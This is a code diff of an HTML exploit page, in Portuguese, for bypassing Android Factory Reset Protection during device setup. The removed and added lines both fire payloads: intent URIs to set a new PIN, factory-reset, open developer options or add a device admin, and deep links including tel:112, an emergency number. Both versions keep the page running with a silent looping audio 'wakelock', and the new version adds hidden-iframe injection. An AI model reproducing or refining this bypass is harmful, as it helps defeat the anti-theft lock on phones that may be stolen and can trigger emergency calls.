@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FRP Overlay Exploit (Android 16)</title>
+    <title>FRP Overlay Exploit (Android 16) - V2</title>
     <style>
         body { font-family: -apple-system, sans-serif; padding: 20px; background-color: #121212; color: #ffffff; }
         .btn { display: block; width: 100%; padding: 12px; margin: 8px 0; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: bold; }
@@ -16,54 +16,43 @@
     </style>
 </head>
 <body>
-    <h2>🚀 BAL Bypass (Overlay)</h2>
-    <p>Áudio fantasma ativo para manter o contexto vivo em background.</p>
+    <h2>🚀 Bypass via Deep Links</h2>
+    <p>O WebView bloqueia "intent://". Vamos usar esquemas universais (tel, mailto, web).</p>
 
-    <!-- Áudio silencioso em Base64 para manter a aba acordada em segundo plano -->
     <audio id="wakelock" loop>
         <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
     </audio>
 
-    <!-- Payload 1: Definir Senha/PIN (Foco principal para sobrescrever o Keystore) -->
-    <button class="btn btn-success" onclick="iniciarBomba('intent:#Intent;action=android.app.action.SET_NEW_PASSWORD;end')">
-        1. Forçar Criação de PIN
+    <!-- NOVAS ROTAS (Fuga de WebView) -->
+    <button class="btn btn-success" onclick="iniciarBomba('tel:112')">
+        1. Forçar Discador (Esquema 'tel:')
     </button>
 
-    <!-- Payload 2: Forçar Tela Inicial (Tenta pular o Setup Wizard) -->
-    <button class="btn btn-warning" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.HOME;end')">
-        2. Forçar Tela Inicial (Launcher)
+    <button class="btn btn-warning" onclick="iniciarBomba('mailto:admin@google.com')">
+        2. Forçar Gmail (Esquema 'mailto:')
     </button>
 
-    <!-- Payload 3: Reset de Fábrica Direto (Ignora UI de configurações) -->
-    <button class="btn btn-danger" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.MASTER_CLEAR;end')">
-        3. Reset de Fábrica Direto
+    <button class="btn" onclick="iniciarBomba('https://play.google.com/store/apps/details?id=com.android.settings')">
+        3. Forçar Play Store (Deep Link)
     </button>
 
-    <!-- Payload 4: Opções de Desenvolvedor (Para tentar OEM Unlock) -->
-    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end')">
-        4. Opções de Desenvolvedor
+    <!-- Rota de PIN com formatação alternativa (Tenta escapar via iframe) -->
+    <button class="btn btn-danger" onclick="iniciarBomba('intent:#Intent;action=android.app.action.SET_NEW_PASSWORD;category=android.intent.category.DEFAULT;end')">
+        4. Criação de PIN (Modo Iframe)
     </button>
-
-    <!-- Payload 5: Adicionar Administrador do Dispositivo -->
-    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.app.action.ADD_DEVICE_ADMIN;end')">
-        5. Injetar Tela de Administrador
-    </button>
-
-    <!-- Payload 6: Marcador de Telefone (Para códigos USSD) -->
-    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.DIAL;end')">
-        6. Injetar Marcador de Telefone
+    
+    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.settings.SETTINGS;end')">
+        5. Configurações (Modo Iframe)
     </button>
 
     <div id="status">Aguardando comando...</div>
 
     <script>
         function iniciarBomba(intentUri) {
-            // Toca o áudio invisível para forçar o Android a manter o navegador rodando no fundo
             let audio = document.getElementById('wakelock');
-            audio.play().catch(e => console.log("Erro de autoplay ignorado", e));
+            audio.play().catch(e => console.log("Audio play blocker", e));
 
-            // Usa o relógio absoluto do sistema em vez de contar ciclos (evita atrasos)
-            let tempoAlvo = Date.now() + 10000; // Exatamente 10 segundos no futuro
+            let tempoAlvo = Date.now() + 10000; 
             const statusDiv = document.getElementById('status');
             
             const intervalo = setInterval(() => {
@@ -73,13 +62,22 @@
                     statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD AGORA!<br>Injetando tela em: ${tempoRestante}s`;
                 } else {
                     clearInterval(intervalo);
-                    statusDiv.innerHTML = "💥 INJETANDO INTENT...";
+                    statusDiv.innerHTML = "💥 INJETANDO CÓDIGO...";
                     
-                    // Dispara o intent e pausa o áudio
+                    // MÉTODO 1: Redirecionamento Direto
                     window.location.href = intentUri;
+                    
+                    // MÉTODO 2: Injeção via Iframe Oculto (Bypassa algumas proteções do WebView)
+                    setTimeout(() => {
+                        let iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        iframe.src = intentUri;
+                        document.body.appendChild(iframe);
+                    }, 500);
+
                     audio.pause();
                 }
-            }, 200); // Verifica a cada 200ms para máxima precisão
+            }, 200);
         }
     </script>
 </body>
